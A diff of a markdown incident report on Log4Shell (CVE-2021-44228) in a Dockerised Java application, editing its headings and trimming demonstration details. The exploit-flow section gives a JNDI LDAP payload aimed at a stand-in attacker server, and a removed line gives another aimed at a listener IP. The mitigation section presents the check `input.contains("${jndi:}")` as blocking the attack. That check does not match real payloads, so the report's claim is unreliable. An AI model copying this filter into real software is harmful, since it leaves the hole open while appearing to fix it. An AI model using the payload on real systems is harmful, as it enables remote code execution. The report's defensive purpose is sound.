@@ -3,7 +3,7 @@
 Stephen Carver
 ---
 
-## 1. Executive Summary
+## 1. Overview
 
 This report details a Log4Shell (CVE-2021-44228) vulnerability found in a Java application. It outlines the application architecture, explains how the exploit occurs, and describes the mitigation steps taken. The "before" state of the application used a vulnerable version of Log4j (2.14.1), allowing for potential Remote Code Execution (RCE) via malicious JNDI LDAP lookups. The "after" state demonstrates the implemented fix by upgrading Log4j to version 2.17.0 and adding input validation.
 
@@ -13,7 +13,6 @@ This report details a Log4Shell (CVE-2021-44228) vulnerability found in a Java a
 
 ![Diagram](diagram.svg)
 
-**Conceptual Diagram Description:**
 
 * **User/Attacker:** An external entity interacting with the Java application.
 * **Java Application (`app` service):**
@@ -26,14 +25,10 @@ This report details a Log4Shell (CVE-2021-44228) vulnerability found in a Java a
     * Runs in a separate Docker container (image: `osixia/openldap:1.5.0`).
     * Exposes port 389.
     * In the exploit scenario, this represents an attacker-controlled LDAP server.
-    * The `docker-compose.yml` defines this service with `LDAP_ORGANISATION=Attacker` and `LDAP_DOMAIN=attacker.com`.
-* **Network:**
-    * Both services are on the same Docker network, allowing them to communicate.
-    * The `extra_hosts` configuration `"host.docker.internal:host-gateway"` is present but not directly involved in this specific exploit path.
 
 **Flow of Exploit:**
 
-1.  Attacker sends a malicious string (e.g., `${jndi:ldap://attacker-ldap-server/a}`) to the `/log` endpoint of the Java application.
+1.  Attacker sends a malicious string (`${jndi:ldap://attacker-ldap-server/a}`) to the `/log` endpoint of the Java application.
 2.  The Java application's vulnerable Log4j library attempts to resolve the JNDI lookup.
 3.  Log4j makes a connection to the (attacker-controlled) LDAP server.
 4.  The LDAP server can respond with a reference to a malicious Java class, which the application would then load and execute (RCE). The provided `ldap_server.py` simulates the listening part of this attacker server.
@@ -58,11 +53,6 @@ The Log4Shell vulnerability (CVE-2021-44228) affected Apache Log4j, a widely use
     * The attacker's LDAP server (simulated by `ldap_server.py` which listens for connections and received data) can then serve a JNDI reference that points to a remote Java class file.
     * The vulnerable Java application will deserialize or load this remote class, leading to Remote Code Execution (RCE) on the application server.
 
-**Demonstration with Provided Files:**
-
-* The `docker-compose.yml` sets up the Java application (`app`) and an LDAP server (`ldap`). While the provided `ldap` service in `docker-compose.yml` is `osixia/openldap`, the exploit typically involves the JNDI lookup pointing to an *external* attacker-controlled LDAP server. The `ldap_server.py` is a simple Python script that can act as a fake LDAP server listening for connections, demonstrating that a callback can be received.
-* If an attacker sends `${jndi:ldap://<ip_of_machine_running_ldap_server.py>:389/Exploit}` to the `/log` endpoint of the "before" application, the Log4j library would attempt to connect to the Python LDAP server. The `ldap_server.py` would print a message indicating a connection was received.
-
 ---
 
 ## 4. Mitigation and Response Summary
@@ -80,13 +70,13 @@ The vulnerability was addressed through a combination of upgrading the Log4j lib
     * As an additional security layer, the `LogController.java` was modified to include basic input validation.
     * The code now checks if the input string contains the pattern `${jndi:}`:
         ```java
-        if (input.contains("${jndi:}")){ //
-            return "Invalid input detected"; //
+        if (input.contains("${jndi:}")){
+            return "Invalid input detected";
         }
         ```
     * If this pattern is detected, the application rejects the input and does not log it in a way that would trigger JNDI lookup, even if the Log4j version were somehow still vulnerable or a new, similar vulnerability emerged.
 
-**Incident Response Summary (General Recommendations):**
+**Incident Response Summary:**
 
 While the provided files focus on the technical fix, a typical incident response to Log4Shell would involve:
 
@@ -106,5 +96,3 @@ While the provided files focus on the technical fix, a typical incident response
     * **Security Best Practices:** Implementing defense-in-depth, including input validation, network segmentation, and egress filtering.
     * **Security Testing:** Regularly performing vulnerability scanning and penetration testing.
     * **Logging and Monitoring:** Enhancing logging to detect suspicious activities, such as unusual outbound connections or JNDI lookup attempts (even if blocked). The `log4j2.xml` configuration can be reviewed to ensure appropriate log levels and appenders are in place for monitoring.
-
-The `docker-compose.yml` files for "before" and "after" are identical in terms of service definitions and ports, indicating the core infrastructure setup did not change, only the application code and its dependencies. The `log4j2.xml` configuration file also remained unchanged between the "before" and "after" states, focusing the mitigation efforts on the library version and application code.
